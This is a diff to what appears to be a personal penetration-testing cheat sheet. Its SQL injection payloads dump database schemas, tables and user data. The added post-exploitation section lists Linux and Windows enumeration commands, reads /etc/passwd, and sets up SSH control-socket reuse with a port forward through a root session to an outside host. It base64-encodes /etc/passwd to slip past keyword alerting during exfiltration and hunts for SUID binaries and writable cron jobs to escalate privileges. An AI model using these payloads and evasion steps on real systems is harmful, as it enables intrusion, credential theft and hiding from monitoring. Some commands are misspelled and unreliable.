@@ -81,8 +81,7 @@ break *main
 run
 ni	#next instruction
 
-/////////// SQL Injection \\\\\\\\\\\\\\\\
-
+/////////// SQL Injection \\\\\\\\\\\\\\\\ 
 insert into members(firstname, lastname, username, password, email, permissions) values('bob', 'jones', 'Hacker', 'qwer@gmail.com', 1);#
 
 ) ' " -- #
@@ -116,6 +115,48 @@ admin' UNION SELECT SCHEMA_NAME,2,3,4,5 from Information_Schema.Schemata;#
 
 admin' UNION SELECT table_schema,2,table_name,column_name,5 FROM Information_Schema.Columns;#
 admin' UNION SELECT name,2,3,4,5 from session.user;#
+
+////// Post Exploitation \\\\\\
+//Linux Enumeration
+ip a 
+uname -a
+cat /etc/os-release
+ss -tupln
+ss -atpn | grep -i estab
+nc localhost <port on loopback>
+cat /sys/class/dmi/id/ *
+w	-or-	who
+cat /etc/hosts
+cat /etc/passwd
+systemctrl list-unit-files --state=enabled
+journalctl -u ssh 		(can append SYSLOG_FACILITY=authpriv)
+chkconfig
+|tee		#send to a file and to stdout
+lsof  -p <prosessid>
+
+//SSH Multiplexing (AKA control sockets)
+ssh -M -S /tmp/s root@10.50.20.220 -NTf				#creates the master
+ssh -S /tmp/s root@10.50.20.220					#uses master and doesnt ask you to re auth
+ssh -S /tmp/s root@10.50.20.220 -L 2222:rustyvega.com:1234	#create a port forward using created mutiplex
+
+//Exfil data bypassing keyword alerters 
+cat /etc/passwd | base64		#encode the data and then decode once exfilled (base64 -d)
+
+//Windows Enumeration
+tasklist /v
+tasklist /svc
+ipconfig /all
+
+///////// Linux Priv Esc \\\\\\\\\ 
+sudo -l				#what can i do?
+/usr/bin/apt-get		#allows you to use "GTFO BINS"
+
+find / -type f -perm /4000 2>/dev/nul
+/usr/bin/find			#not normal
+
+find /etc/cron*
+cat /etc/crontab	-or-	/etc/cron.d
+find /etc/cron* -writable
 
 ==================================================================================================
 python -m SimpleHTTPServer		#python simple http server
